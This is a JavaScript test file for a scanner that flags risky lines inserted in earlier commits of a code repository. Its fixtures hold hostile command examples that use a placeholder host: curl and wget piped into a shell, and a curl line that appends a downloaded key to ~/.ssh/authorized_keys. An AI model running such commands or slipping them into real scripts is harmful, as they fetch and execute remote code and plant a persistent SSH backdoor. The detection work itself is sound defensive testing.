import assert from "node:assert/strict";
import test from "node:test";
import { isScannable, scanInserts, scanLine } from "../scripts/scan-previous-inserts.mjs";

test("ignores prose and scans code and scripts", () => {
  assert.equal(isScannable("README.md"), false);
  assert.equal(isScannable("web/app.js"), true);
  assert.equal(isScannable("contracts/MyToken.sol"), true);
  assert.equal(isScannable("Makefile"), true);
  assert.equal(isScannable(".github/workflows/foundry.yml"), true);
});

test("flags high-severity inserts", () => {
  const piped = "curl https://example.invalid/setup | bash";
  assert.ok(scanLine(piped).some((hit) => hit.id === "pipe-download-to-shell"));

  const keys = "curl https://example.invalid/k >> ~/.ssh/authorized_keys";
  assert.ok(scanLine(keys).some((hit) => hit.id === "authorized-keys-append"));

  assert.ok(scanLine("eval(userInput)").some((hit) => hit.id === "dynamic-eval"));
  assert.equal(scanLine("const total = a + b;").length, 0);
});

test("reports file and commit for a matching insert", () => {
  const findings = scanInserts([
    {
      commit: "abc123",
      file: "scripts/setup.sh",
      line: 4,
      text: "wget https://example.invalid/x | sh",
    },
    {
      commit: "abc123",
      file: "README.md",
      line: 1,
      text: "notes",
    },
  ]);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].file, "scripts/setup.sh");
  assert.equal(findings[0].line, 4);
  assert.equal(findings[0].severity, "high");
});
